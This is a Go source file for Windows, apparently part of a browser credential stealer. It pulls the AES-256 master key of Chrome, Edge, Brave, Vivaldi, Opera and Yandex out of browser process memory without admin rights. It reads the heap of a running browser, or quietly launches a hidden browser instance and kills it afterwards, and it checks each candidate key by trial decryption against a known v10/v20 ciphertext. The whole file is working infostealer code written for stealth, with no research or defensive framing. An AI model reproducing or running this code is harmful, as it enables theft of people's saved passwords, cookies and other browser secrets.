//go:build windows

package main

// memkey_windows.go – extract Chrome/Edge AES-256 key from process heap.
//
// Strategy (no admin required):
//   1. If the browser is already running, scan its heap directly.
//      Chrome/Edge run at Medium integrity; PROCESS_VM_READ opens without elevation.
//   2. If the browser is not running, spawn a hidden instance so it loads the
//      profile (which causes it to decrypt the master key into memory), scan that
//      process, then terminate it.  No window ever appears to the user.
//
// The 32-byte AES-256 master key lives as a plain heap allocation.  We slide a
// 32-byte window across private committed writable pages and use a known v10/v20
// ciphertext as a decryption oracle.  AES-GCM auth-tag failure is cryptographically
// guaranteed for the wrong key (false-positive probability = 2^-128).

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

// ── additional kernel32 procs ────────────────────────────────────────────────

var (
	procCreateToolhelp32Snapshot = kernel32dll.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW          = kernel32dll.NewProc("Process32FirstW")
	procProcess32NextW           = kernel32dll.NewProc("Process32NextW")
	procOpenProcess              = kernel32dll.NewProc("OpenProcess")
	procVirtualQueryEx           = kernel32dll.NewProc("VirtualQueryEx")
	procReadProcessMemory        = kernel32dll.NewProc("ReadProcessMemory")
	procCloseHandle              = kernel32dll.NewProc("CloseHandle")
	procTerminateProcess         = kernel32dll.NewProc("TerminateProcess")
)

// ── Windows constants ────────────────────────────────────────────────────────

const (
	th32csSnapprocess       = 0x00000002
	processVMRead           = 0x00000010
	processQueryInformation = 0x00000400
	memCommit               = 0x00001000
	memPrivate              = 0x00020000
	pageReadWrite           = 0x04
	pageWritecopy           = 0x08
	pageExecuteReadwrite    = 0x40
	pageExecuteWritecopy    = 0x80
	invalidHandleValue      = ^uintptr(0)
	maxScanRegion           = 256 * 1024 * 1024
	createNoWindow          = 0x08000000
)

// ── Windows structs ──────────────────────────────────────────────────────────

// processEntry32W mirrors PROCESSENTRY32W on amd64.
// Go inserts 4 bytes of implicit padding before th32DefaultHeapID to satisfy
// its 8-byte alignment requirement — matching MSVC's layout.
type processEntry32W struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr // offset 16 on amd64 (4 implicit padding bytes at 12-15)
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

// memoryBasicInformation mirrors MEMORY_BASIC_INFORMATION on amd64 (48 bytes).
// The "spare" field covers PartitionId(2)+padding(2) on Win10+ or pure padding
// on older builds — we don't use it either way.
type memoryBasicInformation struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	spare             uint32 // PartitionId+pad or pure pad — unused
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
	pad               uint32
}

// ── helpers ──────────────────────────────────────────────────────────────────

func utf16PtrToStr(p []uint16) string {
	n := 0
	for n < len(p) && p[n] != 0 {
		n++
	}
	return string(utf16.Decode(p[:n]))
}

// highEntropy rejects obvious non-key sequences (all-same-byte).
func highEntropy(b []byte) bool {
	if len(b) < 32 {
		return false
	}
	f := b[0]
	for _, v := range b[1:32] {
		if v != f {
			return true
		}
	}
	return false
}

// tryDecryptKey tests whether key correctly decrypts a v10/v20 AES-GCM blob.
// A wrong key fails the GCM auth-tag check with probability 1 - 2^-128.
func tryDecryptKey(key, ciphertext []byte) bool {
	if len(key) != 32 || len(ciphertext) < 15 {
		return false
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return false
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return false
	}
	_, err = gcm.Open(nil, ciphertext[3:15], ciphertext[15:], nil)
	return err == nil
}

// ── process enumeration ──────────────────────────────────────────────────────

func findBrowserPIDs(exeNames []string) []uint32 {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(th32csSnapprocess, 0)
	if snap == invalidHandleValue {
		return nil
	}
	defer procCloseHandle.Call(snap)

	var entry processEntry32W
	entry.dwSize = uint32(unsafe.Sizeof(entry))

	var pids []uint32
	ret, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	for ret != 0 {
		name := strings.ToLower(utf16PtrToStr(entry.szExeFile[:]))
		for _, want := range exeNames {
			if name == want {
				pids = append(pids, entry.th32ProcessID)
				break
			}
		}
		entry.dwSize = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	}
	return pids
}

// ── memory scanner ───────────────────────────────────────────────────────────

func scanPIDForKey(pid uint32, ciphertext []byte) ([]byte, error) {
	handle, _, _ := procOpenProcess.Call(
		processVMRead|processQueryInformation,
		0,
		uintptr(pid),
	)
	if handle == 0 {
		return nil, fmt.Errorf("OpenProcess(%d) denied", pid)
	}
	defer procCloseHandle.Call(handle)

	var addr uintptr
	var mbi memoryBasicInformation
	mbiSize := unsafe.Sizeof(mbi)

	for {
		ret, _, _ := procVirtualQueryEx.Call(handle, addr, uintptr(unsafe.Pointer(&mbi)), mbiSize)
		if ret == 0 {
			break
		}
		regionSize := mbi.RegionSize
		addr += regionSize

		if mbi.State != memCommit || mbi.Type != memPrivate {
			continue
		}
		switch mbi.Protect {
		case pageReadWrite, pageWritecopy, pageExecuteReadwrite, pageExecuteWritecopy:
		default:
			continue
		}
		if regionSize == 0 || regionSize > maxScanRegion {
			continue
		}

		buf := make([]byte, regionSize)
		var bytesRead uintptr
		procReadProcessMemory.Call(
			handle,
			mbi.BaseAddress,
			uintptr(unsafe.Pointer(&buf[0])),
			regionSize,
			uintptr(unsafe.Pointer(&bytesRead)),
		)
		if bytesRead < 32 {
			continue
		}
		buf = buf[:bytesRead]

		for i := 0; i+32 <= len(buf); i += 16 {
			candidate := buf[i : i+32]
			if !highEntropy(candidate) {
				continue
			}
			if tryDecryptKey(candidate, ciphertext) {
				key := make([]byte, 32)
				copy(key, candidate)
				return key, nil
			}
		}
	}
	return nil, fmt.Errorf("key not found in PID %d", pid)
}

// ── browser exe discovery ────────────────────────────────────────────────────

func findBrowserExe(browserName string) string {
	lower := strings.ToLower(browserName)
	lad := os.Getenv("LOCALAPPDATA")
	pf := os.Getenv("PROGRAMFILES")
	pf86 := os.Getenv("PROGRAMFILES(X86)")
	if pf == "" {
		pf = `C:\Program Files`
	}
	if pf86 == "" {
		pf86 = `C:\Program Files (x86)`
	}

	var candidates []string
	switch {
	case strings.Contains(lower, "edge"):
		candidates = []string{
			filepath.Join(pf86, `Microsoft\Edge\Application\msedge.exe`),
			filepath.Join(pf, `Microsoft\Edge\Application\msedge.exe`),
		}
		if lad != "" {
			candidates = append(candidates, filepath.Join(lad, `Microsoft\Edge\Application\msedge.exe`))
		}
	case strings.Contains(lower, "brave"):
		candidates = []string{
			filepath.Join(pf, `BraveSoftware\Brave-Browser\Application\brave.exe`),
			filepath.Join(pf86, `BraveSoftware\Brave-Browser\Application\brave.exe`),
		}
	case strings.Contains(lower, "vivaldi"):
		candidates = []string{
			filepath.Join(lad, `Vivaldi\Application\vivaldi.exe`),
		}
	case strings.Contains(lower, "opera"):
		candidates = []string{
			filepath.Join(lad, `Programs\Opera GX\opera.exe`),
			filepath.Join(lad, `Programs\Opera\opera.exe`),
		}
	default: // Chrome / Chromium
		candidates = []string{
			filepath.Join(pf, `Google\Chrome\Application\chrome.exe`),
			filepath.Join(pf86, `Google\Chrome\Application\chrome.exe`),
		}
		if lad != "" {
			candidates = append(candidates, filepath.Join(lad, `Google\Chrome\Application\chrome.exe`))
		}
	}

	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			return c
		}
	}
	return ""
}

// ── hidden browser spawn ─────────────────────────────────────────────────────

// spawnHiddenBrowser launches the browser with no visible window, waits for
// it to load the profile (and decrypt its master key), scans the process heap
// for the key, then terminates the process.
func spawnHiddenBrowser(exePath string, ciphertext []byte) ([]byte, error) {
	// Command line: quoted exe path + flags that suppress UI and background activity.
	cmdLine := fmt.Sprintf(
		`"%s" --no-startup-window --no-first-run --disable-extensions --disable-sync --disable-background-networking`,
		exePath,
	)
	cmdLineW, err := syscall.UTF16PtrFromString(cmdLine)
	if err != nil {
		return nil, fmt.Errorf("UTF16 convert: %w", err)
	}

	si := new(syscall.StartupInfo)
	si.Cb = uint32(unsafe.Sizeof(*si))
	si.Flags = syscall.STARTF_USESHOWWINDOW
	si.ShowWindow = 0 // SW_HIDE

	pi := new(syscall.ProcessInformation)

	if err := syscall.CreateProcess(
		nil,       // lpApplicationName — nil so Windows parses cmdLine
		cmdLineW,
		nil, nil,  // no custom security attributes
		false,     // don't inherit handles
		createNoWindow,
		nil, nil,  // inherit environment and working dir
		si, pi,
	); err != nil {
		return nil, fmt.Errorf("CreateProcess(%s): %w", exePath, err)
	}
	defer syscall.CloseHandle(pi.Thread)
	defer procTerminateProcess.Call(uintptr(pi.Process), 0)
	defer syscall.CloseHandle(pi.Process)

	// Give the browser enough time to load the profile and decrypt the master key.
	time.Sleep(2500 * time.Millisecond)

	return scanPIDForKey(pi.ProcessId, ciphertext)
}

// ── browser exe name map ─────────────────────────────────────────────────────

func browserExeNames(browserName string) []string {
	lower := strings.ToLower(browserName)
	switch {
	case strings.Contains(lower, "edge"):
		return []string{"msedge.exe"}
	case strings.Contains(lower, "brave"):
		return []string{"brave.exe"}
	case strings.Contains(lower, "vivaldi"):
		return []string{"vivaldi.exe"}
	case strings.Contains(lower, "yandex"):
		return []string{"browser.exe"}
	case strings.Contains(lower, "opera"):
		return []string{"opera.exe"}
	default:
		return []string{"chrome.exe"}
	}
}

// ── public entry point ───────────────────────────────────────────────────────

// getKeyFromBrowserMemory extracts the Chrome/Edge AES-256 master key by
// spawning a hidden browser instance, scanning its heap, then terminating it.
// No admin rights required.
//
// If the browser is already running (profile lock held), the spawned process
// exits quickly as a relay — in that case we fall back to scanning the running
// instance directly, which also requires no elevation.
func getKeyFromBrowserMemory(browserName string, ciphertext []byte) ([]byte, error) {
	if len(ciphertext) < 15 {
		return nil, fmt.Errorf("ciphertext too short for oracle")
	}

	exePath := findBrowserExe(browserName)
	if exePath != "" {
		if key, err := spawnHiddenBrowser(exePath, ciphertext); err == nil {
			return key, nil
		}
	}

	// Spawn failed or exe not found — browser may already be running (profile
	// lock prevents a second instance from loading the profile). Scan it directly.
	for _, pid := range findBrowserPIDs(browserExeNames(browserName)) {
		if key, err := scanPIDForKey(pid, ciphertext); err == nil {
			return key, nil
		}
	}

	return nil, fmt.Errorf("could not extract key for %s", browserName)
}
